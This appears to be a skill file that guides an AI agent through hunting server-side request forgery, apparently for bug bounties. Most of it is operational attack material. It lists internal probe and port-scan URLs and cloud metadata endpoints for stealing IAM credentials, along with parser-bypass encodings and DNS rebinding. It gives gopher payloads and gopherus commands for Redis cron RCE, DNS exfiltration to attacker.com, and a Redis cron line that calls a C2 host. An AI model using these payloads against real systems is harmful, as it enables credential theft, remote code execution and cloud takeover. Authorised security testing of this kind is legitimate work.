---
name: hunt-ssrf
description: Server-side request forgery — blind, semi-blind, cloud metadata, gopher/dict, DNS rebinding.
keywords: [ssrf, server-side request forgery, cloud metadata, imds, gopher, dict, dns rebinding, url fetcher, webhook, proxy]
---

# hunt-ssrf

## When this skill loads

Triggers: "ssrf", "url fetch", "image proxy", "webhook", "PDF render
from URL", "import from URL", "screenshot service", "metadata
endpoint", "169.254.169.254".

## Common SSRF sinks to find

- `?url=`, `?endpoint=`, `?callback=`, `?dest=`, `?next=`
- Profile picture fetch by URL
- Webhook destinations (Slack-style integrations)
- "Import from URL" (RSS readers, document converters)
- Server-side PDF rendering (`wkhtmltopdf`, headless Chrome)
- Server-side screenshot (`puppeteer`, `playwright`)
- Markdown image fetchers, OG-tag preview fetchers
- File uploads that accept `Content-Location` / external `src`

## Phase 1 — confirm fetcher is server-side

Point at a Burp Collaborator / interact.sh URL:

```
https://<collab>.oast.fun/x
```

If you see DNS + HTTP from the **server IP** (not the client browser
IP), it's server-side. If only client IP visits, it's a client-side
fetcher → no SSRF.

## Phase 2 — internal probing

Once SSRF is confirmed, enumerate:

```
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://[::ffff:127.0.0.1]/
```

Port-scan via response timing or content length:

```
http://127.0.0.1:6379/   (Redis)
http://127.0.0.1:9200/   (Elasticsearch)
http://127.0.0.1:8500/v1/agent/self  (Consul)
http://127.0.0.1:8080/manager/html   (Tomcat)
http://127.0.0.1:15672/  (RabbitMQ mgmt)
http://127.0.0.1:8086/   (InfluxDB)
http://127.0.0.1:5984/   (CouchDB)
```

## Phase 3 — cloud metadata

| Cloud | Endpoint | Notes |
|---|---|---|
| AWS (IMDSv1) | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | many EC2s still allow v1 |
| AWS (IMDSv2) | `PUT /latest/api/token` + `X-aws-ec2-metadata-token` | requires non-GET → SSRF must allow method control |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google` | header requirement is key |
| Azure | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A//management.azure.com/` + `Metadata: true` | |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | open |
| Oracle | `http://169.254.169.254/opc/v2/instance/` + `Authorization: Bearer Oracle` | |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | |
| Kubernetes svc | `http://kubernetes.default.svc/api/v1/namespaces/` | when SSRF is from a pod |

## Phase 4 — bypass URL parsers

| Filter | Bypass |
|---|---|
| Allowlist by domain | `http://allowed.com@169.254.169.254/` (userinfo) |
| Block `169.254` | `http://2852039166/` (decimal), `http://0xa9.0xfe.0xa9.0xfe/`, `http://[::ffff:169.254.169.254]/` |
| Block private IPs | DNS rebinding via `rbndr.us` or own zone — TTL 0 |
| Resolve & verify, then re-fetch | Time-of-check vs time-of-use; rebind between checks |
| Block `metadata.google.internal` | `metadata` (short hostname if pod in same VPC), `[::1]` if metadata in host file |
| Block `http://` | `gopher://`, `dict://`, `ftp://`, `file://`, `ldap://`, `tftp://` |
| Block redirects | host the redirect on your own server → server follows 302 to internal |

## Phase 5 — gopher / dict for protocol smuggling

When SSRF allows raw `gopher://` and there's a service that responds
to plaintext (Redis, Memcached, SMTP, MySQL):

```
gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a...
```

Use `gopherus`:

```bash
gopherus --exploit redis        # generates payload for Redis → cron RCE
gopherus --exploit mysql        # MySQL writable file payload
gopherus --exploit smtp         # SMTP relay payload
```

## Phase 6 — blind / semi-blind SSRF

When the response body is hidden:

- **Time-based**: internal port-scan by response timing
  (open port → fast/refused; closed → SYN drop or RST → different
  latency).
- **DNS exfil**: encode data into subdomains queried via
  `http://${b64data}.attacker.com/`. Works when the SSRF resolves
  arbitrary hostnames.

## Phase 7 — impact escalation matrix

| Internal reach | Escalation |
|---|---|
| Cloud metadata | IAM creds → S3 / Secrets Manager / KMS → cloud takeover |
| Redis no auth | `CONFIG SET dir /var/spool/cron && SET x "0 * * * * curl <c2>"` → RCE |
| Memcached | `set` keys to poison cache → app-level impact |
| Internal Jenkins/GitLab | leaked source, build secrets |
| Internal admin UI | direct admin actions if no auth or weak auth |
| K8s API | service-account token in `/var/run/secrets/...` → cluster admin |
| Internal SMTP | relay phishing from `@yourcorp.com` |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #341876 (Shopify) | SSRF via image upload URL → GCP metadata → bucket takeover |
| H1 #807310 (Atlassian) | SSRF via Jira `Webhook` URL → internal admin |
| H1 #1062088 (HackerOne) | SSRF via `URL` param in markdown OG preview |
| H1 #1108591 (GitLab) | Project-import-by-URL → SSRF → Redis RCE chain |
| CVE-2021-26084 (Confluence OGNL) | SSRF + SSTI chain via webhook |
| CVE-2023-36844 (Junos J-Web) | Pre-auth SSRF → file upload |
| CapitalOne 2019 | Misconfigured WAF + IMDSv1 → S3 dump (defining case) |

## Never-submit fallbacks

- Fetch of an attacker-controlled URL with no internal reach and
  no impact beyond a DNS pingback → KILL (this is just a webhook,
  not SSRF).
- SSRF to a *public* URL with no headers from the server → KILL
  unless attacker can prove redirection to internal.
- SSRF that can only return `200 OK` size, no port-scan oracle, no
  metadata access → CHAIN REQUIRED.

## See also

- `hunt-redirect` — SSRF bypass via attacker-controlled 302
- `hunt-xxe` — XXE is often a parallel SSRF vector
- `m365-entra-attack` — Azure-specific IMDS variations
- `hunt-cache-poison` — internal cache poisoning when SSRF reaches an
  internal CDN
